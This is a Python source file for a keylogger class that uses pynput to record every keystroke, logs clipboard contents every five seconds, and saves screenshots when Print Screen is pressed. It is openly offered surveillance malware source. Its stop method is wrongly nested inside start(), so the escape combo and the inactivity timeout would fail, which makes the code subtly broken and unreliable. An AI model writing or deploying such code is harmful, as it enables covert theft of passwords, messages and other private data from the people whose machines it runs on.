import pynput.keyboard
import threading
import time
import pyperclip
from PIL import ImageGrab

KEY = pynput.keyboard.Key


class Keylogger:
    def __init__(self, escape_combo=(KEY.shift, KEY.f1), timeout=60):
        self.key_log = ""
        self.clipboard_log = ""
        self.keylogger_running = False
        self.key_combo = []
        self.escape_combo = list(escape_combo)
        self.key_listener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)
        self.last_activity = time.time()
        self.timeout = timeout

    def start(self):
        self.keylogger_running = True
        self.key_listener.start()

        threading.Thread(target=self.monitor_clipboard, daemon=True).start()
        threading.Thread(target=self.monitor_inactivity, daemon=True).start()

        def stop_key_logger(self):
            self.keylogger_running = False
            self.key_listener.stop()
            threading.Thread.__init__(self.key_listener)

    def monitor_clipboard(self):
        while self.keylogger_running:
            clipboard_content = pyperclip.paste()
            if clipboard_content != self.clipboard_log:
                self.clipboard_log = clipboard_content
                self.key_log += f"\n[Clipboard]: {clipboard_content}\n"
            time.sleep(5)

    # Monitor inactivity
    def monitor_inactivity(self):
        while self.keylogger_running:
            if time.time() - self.last_activity > self.timeout:
                print("Inactivity detected. Stopping keylogger.")
                self.stop_key_logger()
            time.sleep(5)

    def capture_screenshot(self):
        screenshot = ImageGrab.grab()
        screenshot.save(f"screenshot_{time.strftime('%Y%m%d-%H%M%S')}.png")

    # Keyboard event handler
    def on_keyboard_event(self, event):
        if event == KEY.backspace:
            self.key_log += " [Bck] "
        elif event == KEY.tab:
            self.key_log += " [Tab] "
        elif event == KEY.enter:
            self.key_log += "\n"
        elif event == KEY.space:
            self.key_log += " "
        elif type(event) == KEY:  
            self.key_log += " [" + str(event)[4:] + "] "
        else:
            self.key_log += str(event)[1:len(str(event)) - 1]  

        self.last_activity = time.time()  

        if event == KEY.print_screen:
            self.capture_screenshot()

        self.check_escape_char(event)

    def check_escape_char(self, key):
        self.key_combo.append(key)
        if key != self.escape_combo[len(self.key_combo) - 1]:
            self.key_combo = []
        else:
            if self.key_combo == self.escape_combo:
                self.stop_key_logger()

    def get_key_log(self):
        return self.key_log

    def clear_key_log(self):
        self.key_log = ""

